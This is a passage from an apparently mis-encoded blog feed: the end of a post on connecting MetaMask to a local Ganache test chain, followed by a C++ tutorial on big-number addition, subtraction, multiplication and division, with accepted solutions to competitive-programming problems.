<p>å®‰è£…å®Œä»¥åï¼Œå…ˆæ·»åŠ ä¸€ä¸ªç½‘ç»œï¼Œå°†æˆ‘ä»¬çš„æœ¬åœ°æµ‹è¯•ç½‘ç»œæ·»åŠ åˆ°<code>MetaMask</code></p>
<p><img src="https://cdn.yalexin.top/image-20230102101940590.png" alt="image-20230102101940590"></p>
<p>ç„¶åå†å›åˆ°<code>Ganache</code>ä¸­ï¼Œå¤åˆ¶å‡ ä¸ªè´¦æˆ·çš„ç§é’¥ï¼Œå¯¼å…¥åˆ°<code>MetaMask</code>ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ¯ä¸ªè´¦æˆ·éƒ½æœ‰100ä¸ªä»¥å¤ªå¸äº†</p>
<hr>
<p>ä¸‹ä¸€ç¯‡æ–‡ç« æˆ‘ä»¬å°†ä½¿ç”¨<code>Vue</code>ï¼Œå€ŸåŠ©æ™ºèƒ½åˆçº¦çš„<code>json</code>æ–‡ä»¶ä¸æœ¬åœ°æµ‹è¯•é“¾ä¸­çš„æ™ºèƒ½åˆçº¦äº¤äº’ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>ã€1ã€‘ChainBlogï¼ˆæœ¬é¡¹ç›®å®Œæ•´æºç ï¼‰.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>ã€2ã€‘web3.jsä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>ã€3ã€‘Solidityä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>ã€4ã€‘truffleæ–‡æ¡£.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>ã€5ã€‘å¼€å‘ã€éƒ¨ç½²ç¬¬ä¸€ä¸ªDApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>ã€6ã€‘DAppæ•™ç¨‹ï¼šç”¨Truffle å¼€å‘ä¸€ä¸ªé“¾ä¸Šè®°äº‹æœ¬.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>ã€7ã€‘Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜ç²¾åº¦è¿ç®—</title>
    <url>/2021/05/06/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡æ‰€æ¢è®¨çš„å‡ä¸ºé«˜ç²¾åº¦æ•°å­—å¯¹é«˜ç²¾åº¦æ•°å­—è¿›è¡Œçš„æ“ä½œï¼ˆé™¤ç‰¹æ®Šè¯´æ˜å¤–ï¼‰ã€å°šæœªè®¨è®ºè´Ÿæ•°çš„æƒ…å†µã€æ•°å­—çš„æœ€ä½ä½ä¿å­˜åœ¨æ•°ç»„ä¸‹æ ‡<code>0</code>å¤„ã€å°šæœªè¿›è¡Œå‹ä½æ“ä½œï¼ˆé™¤ç‰¹æ®Šè¯´æ˜ï¼‰</p>
</blockquote>
<a id="more"></a>

<h2 id="åŠ æ³•"><a href="#åŠ æ³•" class="headerlink" title="åŠ æ³•"></a>åŠ æ³•</h2><p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">    ans[i] += num1[i] + num2[i];</span><br><span class="line">    <span class="comment">// ä¼ é€’è¿›ä½</span></span><br><span class="line">    ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">    ans[i] %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»ƒæ‰‹é¢˜ç›®ï¼š<a href="https://www.luogu.com.cn/problem/P1601" target="_blank" rel="noopener">æ´›è°·1601</a></p>
<p><code>AC</code>ä»£ç :</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">505</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    len3 = len1 &gt; len2 ? len1 : len2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len3; i++)&#123;</span><br><span class="line">        ans[i] += num1[i] + num2[i];</span><br><span class="line">        <span class="comment">// ä¼ é€’è¿›ä½</span></span><br><span class="line">        ans[i + <span class="number">1</span>] += ans[i] / <span class="number">10</span>;</span><br><span class="line">        ans[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ans[len3] != <span class="number">0</span>)len3++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‡æ³•"><a href="#å‡æ³•" class="headerlink" title="å‡æ³•"></a>å‡æ³•</h2><p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">    ans[i] += big[i] - sml[i];</span><br><span class="line">    <span class="comment">// äº§ç”Ÿå€Ÿä½</span></span><br><span class="line">    <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»ƒæ‰‹é¢˜ç›®ï¼š<a href="https://www.luogu.com.cn/problem/P2142" target="_blank" rel="noopener">æ´›è°·2142</a></p>
<p><code>AC</code>ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="comment">// åˆ¤æ–­ä¸¤ä¸ªæ•°å­—çš„å¤§å°å…³ç³»</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 &gt; len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] &gt; num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2, <span class="keyword">bool</span> positive)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        ans[i] += big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">0</span>)ans[i + <span class="number">1</span>]--, ans[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!positive) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">10090</span>], num2[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">memset</span>(num1, <span class="number">0</span>, <span class="keyword">sizeof</span> num1);</span><br><span class="line">    <span class="built_in">memset</span>(num2, <span class="number">0</span>, <span class="keyword">sizeof</span> num2);</span><br><span class="line">    <span class="keyword">int</span> len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">10090</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmp(len1, len2, num1, num2))sub(num1, len1, num2, len2, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">else</span> sub(num2, len2, num1, len1, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¹˜æ³•"><a href="#ä¹˜æ³•" class="headerlink" title="ä¹˜æ³•"></a>ä¹˜æ³•</h2><p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">        <span class="comment">// ç›¸å½“äºå¾€å·¦åç§»</span></span><br><span class="line">        ans[i + j] += num1[i] * num2[j];</span><br><span class="line">        ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">        ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç»ƒæ‰‹é¢˜ç›®ï¼š<a href="https://www.luogu.com.cn/problem/P1303" target="_blank" rel="noopener">æ´›è°·1303</a></p>
<p><code>AC</code>ä»£ç :</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, num2[<span class="number">2010</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">4020</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len1, len2, len3;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">2001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++)num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; j++)&#123;</span><br><span class="line">            ans[i + j] += num1[i] * num2[j];</span><br><span class="line">            ans[i + j + <span class="number">1</span>] += ans[i + j] / <span class="number">10</span>;</span><br><span class="line">            ans[i + j]  %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    len3 = len1 + len2;</span><br><span class="line">    <span class="keyword">while</span>(ans[len3 - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; len3 &gt;= <span class="number">1</span>)len3--;</span><br><span class="line">    <span class="keyword">if</span> (len3 == <span class="number">0</span>)<span class="keyword">return</span> (<span class="built_in">printf</span>(<span class="string">"0"</span>),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é™¤æ³•"><a href="#é™¤æ³•" class="headerlink" title="é™¤æ³•"></a>é™¤æ³•</h2><h3 id="é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦"><a href="#é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦" class="headerlink" title="é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦"></a>é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦</h3><p>emmï¼Œé«˜ç²¾åº¦é™¤é«˜ç²¾åº¦çš„ç¡®å†™èµ·æ¥æœ‰ç‚¹æ£˜æ‰‹ï¼Œè€Œä¸”æ™®é€šç‰ˆæœ¬çš„æ—¶é—´å¤æ‚åº¦è¾¾åˆ°äº†<code>O(n^2)</code></p>
<p>åŸç†è¿˜æ˜¯æ¨¡æ‹Ÿå°å­¦äºŒå¹´çº§çš„ç«–å¼é™¤æ³•</p>
<p>ç»ƒä¹ é¢˜ç›®ï¼š<a href="http://ybt.ssoier.cn:8088/problem_show.php?pid=1308" target="_blank" rel="noopener">ä¸€æœ¬é€š1308</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> len1, <span class="keyword">int</span> len2, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(len1 != len2)<span class="keyword">return</span> len1 - len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (num1[i] != num2[i])<span class="keyword">return</span> num1[i] - num2[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> big[], <span class="keyword">int</span> &amp;len1, <span class="keyword">int</span> sml[], <span class="keyword">int</span> len2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">        big[i] = big[i] - sml[i];</span><br><span class="line">        <span class="keyword">if</span> (big[i] &lt; <span class="number">0</span>)big[i + <span class="number">1</span>]--, big[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; big[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">numcpy</span><span class="params">(<span class="keyword">int</span> src[], <span class="keyword">int</span> len1, <span class="keyword">int</span> dest[], <span class="keyword">int</span> &amp;len2, <span class="keyword">int</span> startIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å°† é™¤æ•° æ‰©å±•ï¼Œå³é™¤æ•°å’Œè¢«é™¤æ•°é«˜ä½å¯¹é½</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++)dest[startIndex + i] = src[i];</span><br><span class="line">    len2 = len1 + startIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a / b, ç»“æŸåa[] ä¸­æ˜¯ä½™æ•°ï¼Œans[]æ˜¯å•†</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len1, <span class="keyword">int</span> b[], <span class="keyword">int</span> len2, <span class="keyword">int</span> ans[], <span class="keyword">int</span> &amp;len3)</span></span>&#123;</span><br><span class="line">    <span class="comment">// tempç”¨äºæ‰©å±•é™¤æ•°</span></span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">305</span>], tempLen;</span><br><span class="line">    len3 = len1 - len2 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len3 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span> temp);</span><br><span class="line">        numcpy(b, len2, temp, tempLen, i);</span><br><span class="line">        <span class="keyword">while</span>(cmp(len1, tempLen, a, temp) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            ans[i]++;</span><br><span class="line">            sub(a, len1, temp, tempLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> ans[], <span class="keyword">int</span> len1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(len1 &gt;= <span class="number">1</span> &amp;&amp; ans[len1 - <span class="number">1</span>] == <span class="number">0</span>)len1--;</span><br><span class="line">    <span class="keyword">if</span> (len1 == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = len1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1[<span class="number">305</span>], num2[<span class="number">305</span>], ans[<span class="number">305</span>], len1, len2, len3;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">305</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len1 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) num1[i] = buff[len1 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len2 = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++) num2[i] = buff[len2 - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span> ans);</span><br><span class="line">    div(num1, len1, num2, len2, ans, len3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans, len3);</span><br><span class="line">    <span class="built_in">print</span>(num1, len2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä½¿ç”¨<a href="https://zhuanlan.zhihu.com/p/26756957" target="_blank" rel="noopener"> <code>Newton Division</code>æ–¹æ³•</a>ï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥é™åˆ°<code>O(nlog(n))</code>ï¼Œemmï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æœ‰ç‚¹å¤æ‚ï¼Œæˆ‘ä¸æ˜¯å¾ˆçœ‹å¾—æ‡‚ã€‚</p>
<h3 id="é«˜ç²¾åº¦å¯¹å•ç²¾åº¦"><a href="#é«˜ç²¾åº¦å¯¹å•ç²¾åº¦" class="headerlink" title="é«˜ç²¾åº¦å¯¹å•ç²¾åº¦"></a>é«˜ç²¾åº¦å¯¹å•ç²¾åº¦</h3><p>è¿™ä¸ªå°±ç®€å•å¤šäº†ï¼ŒåŸç†è¿˜æ˜¯ä¸€æ ·</p>
<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">    nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">    <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">        ans[i] = nowNum / divNum;</span><br><span class="line">        nowNum = nowNum % divNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»ƒæ‰‹é¢˜ç›®ï¼š<a href="https://www.luogu.com.cn/problem/P1480" target="_blank" rel="noopener">æ´›è°·1480</a></p>
<p><code>AC</code>ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">5005</span>], len, ans[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">5005</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)num[i] = buff[len - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> divNum;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;divNum);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> nowNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">        <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">            ans[i] = nowNum / divNum;</span><br><span class="line">            nowNum = nowNum % divNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len &gt;= <span class="number">1</span> &amp;&amp; ans[len - <span class="number">1</span>] == <span class="number">0</span>)len--;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>)<span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"0"</span>), <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ±‚æ¨¡"><a href="#æ±‚æ¨¡" class="headerlink" title="æ±‚æ¨¡"></a>æ±‚æ¨¡</h2><h3 id="é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦-1"><a href="#é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦-1" class="headerlink" title="é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦"></a>é«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦</h3><p>è¿™ä¸ªå°±æ²¡ä»€ä¹ˆå¥½è®²çš„äº†ï¼Œå‚è€ƒé«˜ç²¾åº¦å¯¹é«˜ç²¾åº¦é™¤æ³•å³å¯</p>
